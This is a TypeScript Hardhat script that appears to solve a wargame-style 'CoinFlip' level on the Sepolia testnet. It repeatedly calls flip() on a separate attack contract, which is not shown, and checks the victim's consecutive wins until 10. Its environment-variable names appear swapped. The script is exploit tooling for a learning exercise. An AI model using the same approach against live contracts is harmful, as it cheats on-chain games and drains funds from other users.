//To more info go to /contracts/03CoinFlipAttack.sol
import { ethers } from "hardhat";
import { ABI_COINFLIP_ATTACK, ABI_COINFLIP_OG } from "./variables/03/ABIS";
import dotenv from "dotenv";

dotenv.config();

const PRIVATE_KEY = process.env.PRIVATE_KEY as string;
// const PRIVATE_KEY = process.env.PRIVATE_KEY_TEST as string;
const CONTRACT_ATTACK_ADDRS = process.env.COINFLIP_OG_ADDRS;
const CONTRACT_OG_ADDRS = process.env.COINFLIP_ATTACK_ADDRS;

if (!CONTRACT_ATTACK_ADDRS) {
  throw new Error(
    "You forgot to pass the adders for the attack contract, in the env file"
  );
}

if (!CONTRACT_OG_ADDRS) {
  throw new Error(
    "You forgot to pass the adders for the original contract, in the env file"
  );
}

const provider = ethers.getDefaultProvider(
  "wss://ethereum-sepolia-rpc.publicnode.com"
);
const signer = new ethers.Wallet(PRIVATE_KEY, provider);

const contractOg = new ethers.Contract(
  CONTRACT_OG_ADDRS,
  ABI_COINFLIP_OG,
  signer
);
const contractAttack = new ethers.Contract(
  CONTRACT_ATTACK_ADDRS,
  ABI_COINFLIP_ATTACK,
  signer
);

const getWins = async () => {
  const wins = await contractOg.consecutiveWins();
  return wins;
};

const flip = async () => {
  await contractAttack.flip();
  console.log("fliped");
};

const main = async () => {
  await flip();
  const wins = await getWins();
  if (wins < 10) {
    console.log("You won", wins, "times, run the script again");
  } else {
    console.log("You won", wins, "times, submit the answer");
  }
};

main();
